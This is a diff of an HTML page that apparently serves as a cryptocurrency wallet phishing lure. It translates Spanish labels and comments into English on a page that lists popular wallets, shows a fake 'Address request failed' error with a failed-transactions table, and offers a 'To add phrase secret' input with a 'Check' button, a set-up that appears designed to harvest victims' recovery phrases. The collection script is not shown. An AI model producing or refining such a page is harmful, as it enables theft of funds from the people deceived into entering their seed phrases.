@@ -26,7 +26,6 @@
     <div class="correction-option">
         <button id="addTextButton">To add phrase secret</button>
         <div id="textInputsContainer" class="text-inputs-container" style="display: none;">
-            <!-- Aquí se añadirán los inputs para los textos -->
         </div>
         <button id="submitTexts" class="submit-texts" style="display: none;">Check</button>
            </div>
@@ -41,7 +40,6 @@
                 <li><a href="https://trustwallet.com/" target="_blank">Trust Wallet</a></li>
                 <li><a href="https://www.coinomi.com/" target="_blank">Coinomi</a></li>
                 <li><a href="https://www.exodus.com/" target="_blank">Exodus</a></li>
-                <!-- Añade más billeteras aquí siguiendo el mismo formato -->
             </ul>
         </ul>
     </nav>
@@ -53,15 +51,15 @@
     <!-- Sección de información de la dirección que será visible tras conectarse -->
     <div id="addressInfo" style="display: none;">
         <h2>Address connect <span id="userAddress"></span></h2>
-        <p>Revisión de eventos fallidos para la dirección especificada debido a error en fee.</p>
+        <p>"Address request failed, please check log details and hash"</p>
         <div id="failedTransactionsList">
-            <h2>Eventos Fallidos Recientes</h2>
+            <h2> View detail on the blockchain </h2>
             <table>
                 <thead>
                     <tr>
-                        <th>Fecha</th>
-                        <th>Descripción del Error</th>
-                        <th>Transacción</th>
+                        <th>Hash Tx</th>
+                        <th>Error.Log</th>
+                        <th>Transaction</th>
                     </tr>
                 </thead>
                 <tbody id="failedTransactionsBody">
